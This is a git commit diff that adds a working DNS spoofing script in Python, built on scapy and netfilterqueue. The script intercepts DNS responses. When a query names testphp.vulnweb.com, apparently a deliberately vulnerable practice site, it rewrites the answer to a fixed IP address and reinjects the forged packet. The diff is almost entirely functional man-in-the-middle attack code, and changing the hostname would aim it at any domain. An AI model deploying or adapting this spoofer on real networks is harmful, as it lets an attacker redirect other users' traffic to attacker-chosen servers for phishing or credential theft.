3f7abbc9b18b47940e4ce6103ca13ac3ed2e0582
Adithiya86 <adithiya8686@gmail.com>
2022-12-30 20:49:08 +0530

    2nd Dns_spoof

--- Dns_spoof.py
+++ Dns_spoof.py
@@ -3,10 +3,29 @@ import scapy.all as scapy
 import netfilterqueue 
 
 def process_packet(packet):
-    print(packet)    
+    scapy_packet = scapy.IP(packet.get_payload())   
+    if scapy_packet.haslayer(scapy.DNSRR):
+        qname = scapy_packet[scapy.DNSQR].qname
+        # print("befor>>>\n",scapy_packet.show())
+        if "testphp.vulnweb.com" in str(qname):
+            answer = scapy.DNSRR(rrname=qname,rdata="157.240.250.35")
+            scapy_packet[scapy.DNS].an =answer
+            scapy_packet[scapy.DNS].ancount = 1
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].len
+            del scapy_packet[scapy.UDP].chksum
+            # print("after >> ",scapy_packet.show2())
+            print("[+] spoofed target.....")
+            packet.set_payload(bytes(scapy_packet))
+    packet.accept()
 
-queue = netfilterqueue.NetfilterQueue()
-queue.bind(0, process_packet)
-queue.run()
 
+try:
+    queue = netfilterqueue.NetfilterQueue()
+    queue.bind(0, process_packet)
+    queue.run()
+
+except KeyboardInterrupt:
+    print("\n[-] keyboard interrupted \nQutting.......")
 
